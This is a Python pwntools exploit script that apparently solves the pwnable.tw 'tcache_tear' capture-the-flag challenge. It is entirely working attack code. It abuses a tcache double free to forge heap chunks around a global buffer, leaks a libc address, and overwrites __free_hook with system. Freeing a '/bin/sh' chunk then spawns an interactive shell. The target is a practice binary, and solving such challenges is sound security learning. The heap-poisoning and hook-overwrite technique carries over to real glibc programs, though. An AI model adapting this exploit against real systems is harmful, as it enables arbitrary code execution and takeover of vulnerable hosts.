from pwn import *
context.log_level='debug'

if args['R'] :
	io=remote('chall.pwnable.tw', 10207)
	elf=ELF('./tcache_tear')
	libc=ELF('./libc.so')
else :
	io=process('./tcache_tear')
	elf=ELF('./tcache_tear')
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(a,b):
	io.sendlineafter(':','1')
	io.sendlineafter('Size:',str(a))
	io.sendlineafter('Data:',str(b))

def free():
	io.sendlineafter(':','2')

def show():
	io.sendlineafter(':','3')
	io.recvuntil("Name :")

name_addr=0x602060
name_chunk_addr=name_addr-0x10
io.recv()
io.sendline('keer')

add(0x70,'a'*8)

free()
free()
add(0x70,p64(name_chunk_addr+0x500))
add(0x70,'a'*0x8)
add(0x70,p64(0)+p64(0x31)+p64(0)*5+p64(0x31))

add(0x60,'a'*0x8)

free()
free()
add(0x60,p64(name_chunk_addr))
add(0x60,"keer")
add(0x60,p64(0)+p64(0x501)+p64(0)*5+p64(name_chunk_addr+0x10)) 

free()
show()
libc_addr=u64(io.recv(8))-96-libc.symbols['__malloc_hook']-0x10
log.success('libc_addr:'+hex(libc_addr))

libc.address=libc_addr
free_hook_addr=libc.symbols['__free_hook']
add(0x40,'a'*0x8)
free()
free()
add(0x40,p64(free_hook_addr))
add(0x40,'keer')
add(0x40,p64(libc.symbols['system']))
io.sendlineafter(':','1')
io.sendlineafter('Size:','32')
io.send('/bin/sh\x00')
free()


#gdb.attach(io)
#pause()
io.interactive()